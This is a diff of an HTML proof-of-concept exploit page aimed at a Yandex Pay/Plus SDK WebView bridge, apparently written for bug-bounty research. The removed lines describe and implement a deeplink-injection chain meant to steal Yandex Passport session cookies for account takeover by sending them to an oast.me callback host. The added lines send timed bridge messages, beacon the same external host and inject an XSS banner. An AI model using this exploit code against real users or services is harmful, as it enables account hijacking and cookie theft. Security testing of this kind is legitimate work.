@@ -1,24 +1,28 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// CRITICAL: Passport cookie theft via deeplink injection
-// 1. OPEN_LINK with urlType:DEEPLINK passes z13=true (whitelist bypass)
-// 2. ybapp://screen.open/open_web?url=ATTACKER&auth=yandex injects cookies
-// 3. WebView loads our URL WITH victim's Yandex Passport session cookies
-// 4. Cookies sent to attacker server = full account takeover
+// Send READY with increasing delays to find the right timing window
+var delays = [500, 1000, 2000, 3000, 5000, 7000, 10000];
 
-window.__plusSDKMobileCompat.onMessage(JSON.stringify({
-  type: "OPEN_LINK",
-  trackId: "ato",
-  payload: {
-    url: "ybapp://screen.open/open_web?url=https%3A%2F%2Fda7db8p9tmut9738sbb0r4setdbsf769t.oast.me%2Fcookie-steal&auth=yandex&control=none",
-    urlType: "DEEPLINK",
-    openType: "IN",
-    needAuth: false
-  }
-}));
+delays.forEach(function(ms) {
+  setTimeout(function() {
+    window.__plusSDKMobileCompat.onMessage(JSON.stringify({type:"READY",trackId:"ready-" + ms}));
+  }, ms);
+});
 
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/ato-sent");
+// Also send READY_FOR_MESSAGES after READY
+delays.forEach(function(ms) {
+  setTimeout(function() {
+    window.__plusSDKMobileCompat.onMessage(JSON.stringify({type:"READY_FOR_MESSAGES",trackId:"rfm-" + ms}));
+  }, ms + 100);
+});
+
+// Report
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/timing-test-sent");
+
+// If overlay dismisses at any point, this content should become visible
+document.body.style.background = '#111';
+document.body.innerHTML += '<div style="padding:40px;text-align:center;color:#fc0;font-family:sans-serif;font-size:24px;margin-top:100px;">XSS in Yandex Pay - r4dl3</div>';
 </script>
 </body>
 </html>
